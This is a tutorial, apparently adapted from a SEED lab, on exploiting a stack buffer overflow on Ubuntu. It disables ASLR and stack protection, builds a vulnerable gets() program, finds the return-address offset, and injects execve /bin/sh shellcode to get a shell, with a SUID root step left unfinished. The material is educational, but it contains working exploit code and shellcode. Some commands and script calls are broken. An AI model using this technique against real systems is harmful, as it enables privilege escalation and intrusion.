# 30 years ago : Buffer Overflow Vulnerability with Proof of Concept (POC)

This is a short tutorial on running a simple buffer overflow on a virtual machine
running Ubuntu. It shows how one can use a buffer overflow to obtain a root
shell.

---
## A) Important Concepts

### ASLR (Address Space Layout Randomization)

First of all, for exploits to work efficiently, you have to disable ASLR
> ASLR is a mechanism which randomly arranges the address space of a process. More information about ASLR can be foun

you can check the current value of ASLR with:
```
cat /proc/sys/kernel/randomize_va_space
```

And then disable it with:
```
sudo sysctl -w kernel.randomize_va_space=0
```

or
```
echo 0 > /proc/sys/kernel/randomize_va_space
```

A confirmation of the variable's value is printed `kernel.randomize_va_space = 0`
by the terminal.

### Endianess

you can check computer endianess with the following code:
```
int num = 1;

if (*(char *)&num == 1) // we take the address of num and convert it to char array and ask for the first byte
    printf("Little-Endian\n");
else
    printf("Big-Endian\n");
```

or simply with the following code:
```
lscpu | grep Endian
```

and check about the file named "{filename}" with:
```
file {filename}
```


### About Users

##### How To Find Which Users Are Logged In

Many times, it will be more useful to find out which users are active on your system.

The "w" command is a simple way to list all of the currently logged in users, their log in time, and what the command they are currently using:
```
w
```

##### See registered users

You might want to check who are the users recorded
```
cut -d: -f1 /etc/passwd
```

among the users I could find some suspicious names:
```
whoopsie:x:112:117::/nonexistent:/bin/false -> used for database crash report
```

and you can count how many users with:
```
cut -d: -f1 /etc/passwd | -wc
```

##### To remove/delete a user

To remove/delete a user, first you can use:
```
sudo userdel username
```

Then you may want to delete the home directory for the deleted user account :
```
sudo rm -r /home/username
```

Please use with caution the above command!

##### Check about when files where accessed for the last time
```
ls -l --time=atime
```

---

## B) POC: Smashing the Stack

### Getting started

Create the file bof.c containing the following:
```c
#include <stdio.h>
#include <string.h>

#include
int main(int argc, char **argv) {
 char buffer[256];
 gets(buffer);
 printf("%s\n", buffer);
 return 0;
}
```

Compile and execute the program with gdb:
```
gcc bof.c -o bof && gdb ./bof
```

execute with a more than 256 times 'X' (lets say 280x)
```
run
```
```
 "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
```

you will get the following output:
```
*** stack smashing detected ***: <unknown> terminated

Program received signal SIGABRT, Aborted.
__GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:51
51	../sysdeps/unix/sysv/linux/raise.c: No such file or directory.
```

exit (CTRL + D and then yes) and now compile it again with no stack protection option:
```
gcc -z execstack -fno-stack-protector bof.c -o bof
```

> **(OPTIONAL)** The -m32 flag can also be added to build a 32bits binary file, you will then use eip instead of rip, ebp instead of rbp register etc)
```
gcc -z execstack -fno-stack-protector -m32 bof.c -o bof
```
you will need gcc-multilib
```
sudo apt-get install gcc-multilib
```

execute again - with a more than 256 times 'X' using python to ease the burden - you will get a segfault:
```
python -c 'print "X" * 500' |   ./bof
```

---

## Getting the address of EIP

Now again with gdb:
```
gdb ./bof
```

or we could have a ready to go file beforehand:
```
python -c 'print "X" * 500' > Xfile
```

or run it directly from gdb:
```
r <<< $(python -c 'print "X" * 500')
```

now the output is different:
```
Program received signal SIGSEGV, Segmentation fault.
0x00005555555546cb in main ()
```

let's check the location of rsp register with ```info registers rsp```
```
(gdb) i r rsp
rsp            0x7fffffffdef8	0x7fffffffdef8
```

and its content:
```
(gdb)  x/xg $rsp
0x7fffffffdef8:	0x5858585858585858
```

---

## Finding the offset of RSP

We will now use a [pattern.py](https://raw.githubusercontent.com/ickerwx/pattern/master/pattern) script to detect the offset where the rsp content value is overwritten
```
#!/usr/bin/env python2
import sys
import struct


def pattern_create(length):
    pattern = ''
    parts = ['A', 'a', '0']
    while len(pattern) != length:
        pattern += parts[len(pattern) % 3]
        if len(pattern) % 3 == 0:
            parts[2] = chr(ord(parts[2]) + 1)
            if parts[2] > '9':
                parts[2] = '0'
                parts[1] = chr(ord(parts[1]) + 1)
                if parts[1] > 'z':
                    parts[1] = 'a'
                    parts[0] = chr(ord(parts[0]) + 1)
                    if parts[0] > 'Z':
                        parts[0] = 'A'
    return pattern


def pattern_offset(value, buflen):
    if value.startswith('0x'):
        value = struct.pack('<I', int(value, 16)).strip('\x00')
    pattern = pattern_create(buflen)
    try:
        return pattern.index(value)
    except ValueError:
        return 'Not found'


def print_help():
    print 'Usage: %s (create | offset) <value> <buflen>' % sys.argv[0]


def main():
    if len(sys.argv) < 3 or sys.argv[1].lower() not in ['create', 'offset']:
        print_help()
        sys.exit(255)

    command = sys.argv[1].lower()
    num_value = sys.argv[2]

    if command == 'create':
        print pattern_create(int(num_value))
    else:
        if len(sys.argv) == 4:
            try:
                buflen = int(sys.argv[3])
            except ValueError:
                print_help()
                sys.exit(254)
        else:
            buflen = 8192
        print pattern_offset(num_value, buflen)

if __name__ == '__main__':
    main()
```

create the pattern file
```
./pattern.py create 500 > pattern.txt &&
a=$(cat pattern.txt)
```

run gdb again ```gdb ./bof``` with a pattern of 500 character :
```
r < pattern.txt
```

(optional) or directly
```
r <<< $(./pattern.py create 500)
```

you will get the following output:
```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq

Program received signal SIGSEGV, Segmentation fault.
0x00005555555546cb in main ()
(gdb) x/s $rsp
0x7fffffffdef8:	"Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap"...
```

we will now look at the value at the address of rsp:
```
x/s $rsp
```

in another terminal use the following  
**NB** replace "Ai8Ai9Aj0Aj1Aj2Aj3Aj" with rsp starting value found with the previous command):
```
b=Ai8Ai9Aj0Aj1Aj2Aj3Aj
```

and finally we get the offset with:
```
offset=$(echo $a | grep -b -o $b | cut -d ':' -f 1) && echo $offset
```

## Overwriting value of RIP register

we create a small file called exploit.sh containing:
```
#!/bin/bash
buffer=$(python -c 'print "A"'*$1  2>&1  /dev/null)
buffer+=$2
echo $buffer
```

and we call it the following way:
```
str="hello" &&
./exploit.sh $offset $str > exploit.txt &&
cat exploit.txt
```

run gdb again ```gdb ./bof``` with our newly created exploit.txt :
```
(gdb) r < exploit.txt
```

that will output hello in hexa:
```
(gdb) i r rip
rip            0x6f6c6c6568	0x6f6c6c6568
```

you can convert easily with the following command line:
```
string="6f6c6c6568" &&
echo "0: $string" | xxd -r
```

---

## Overwriting value of RIP with the shellcode opening a shell

We will now export a string containing the shellcode opening a shell to an environment variable called 'SHXP':
```
export SHXP=$(python -c 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"') && echo $SHXP
```

create a .c file get_env_addr.c :
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
    char *ptr;

    if(argc < 3) {
        printf("Usage: %s <environment variable> <target program name>\n", argv[0]);
        exit(0);
    }
    ptr = getenv(argv[1]); /* get env var location */
    ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* adjust for program name */
    printf("%s will be at %p\n", argv[1], ptr);
}
```
and compile:
```
gcc get_env_addr.c -o get_end_addr
```

Finally you get the address:
```
./get_end_addr SHXP ./bof
SHXP will be at 0x7fffffffe962
```

we will create exploit2.py and give it chmod +x :
```
#!/usr/bin/env python

# usage: ./exploit2.py $offset $(./get_end_addr SHXP ./bof | cut -f 5 -d' ') && cat exploit.txt

# a=$(cat pattern.txt)
# b={replace with rsp starting value found with the previous command
# offset=$(echo $a | grep -b -o $b | cut -d ':' -f 1)

import sys
from struct import *
offset= int(sys.argv[1] if len(sys.argv) > 1 else 0)
addr=int(sys.argv[2], 16)
buf = ""
buf += "\x2a"*offset
buf += pack("<Q", addr)
with open("exploit.txt", "w") as f:
     f.write(buf)
```

and then we generate the file that will give us a shell access:
```
./exploit2.py $offset
```

and finally launch the binary again
```
(cat exploit.txt; cat) | ./bof
```

output:
```
$ (cat exploit.txt; cat) | ./bof
{press enter}
****************** ..
ls
README.md  a.out
```

---

## We have a shell, then what ?

We now need a suid binary. To know if our current folder does contain we run this command:
```
find . -perm -4000
```

to make the file as a binary we can use this:
```
sudo chmod u+s ./bof
```

we run gdb again ```gdb bof``` and set a breakpoint before the leave instruction address
```
set disassembly-flavor intel

disassemble main
0x00000000000006ca <+64>:	leave

break *0x00000000000006ca
```


## C) Shellcode

### Reviewing the shellcodes

This is the shellcode for exit() :
```
perl -e 'print "\x31\xc0\x40\x89\xc3\xcd\x80"' > shellcode
```

You can read the assembly file with following (-b 32 if it was compiled with -m32):
```
ndisasm -b 32 shellcode
```

> install nasm if you have not already:
```
sudo apt-get install nasm
```


you can disassemble these codes  :
[execve](http://man7.org/linux/man-pages/man2/execve.2.html) from [rajvardhan](https://packetstormsecurity.com/files/153038/Linux-x64-execve-bin-sh-Shellcode.html)
```
echo -e "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" > /tmp/shellcode
```
-e     flag enable interpretation of backslash escapes

for 32 bits
```
objdump -Mintel -bbinary -D -mi386 /tmp/shellcode
```
for 64 bits
```
objdump -D -b binary -mi386 -Mx86-64 /tmp/shellcode
```


## How to contact me

Ways to get in touch with me:
* Github: <https://www.github.com/agavrel>

## License

This was adapted from a SEED lab.

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

## References and Thanks

I want to strongly thank all netizen who contributed to my current understanding of this exploit:

* The Shellcoder's handbook
* [Smashing The Stack For Fun And Profit by Aleph One](http://www-inst.eecs.berkeley.edu/~cs161/fa08/papers/stack_smashing.pdf)
* [npapernot's Github about the Buffer Overflow Attack](https://github.com/npapernot/buffer-overflow-attack)
* https://medium.com/@buff3r/basic-buffer-overflow-on-64-bit-architecture-3fb74bab3558
* https://decoder.cloud/2017/01/25/idiots-guide-to-buffer-overflow-on-gnulinux-x64-architecture/
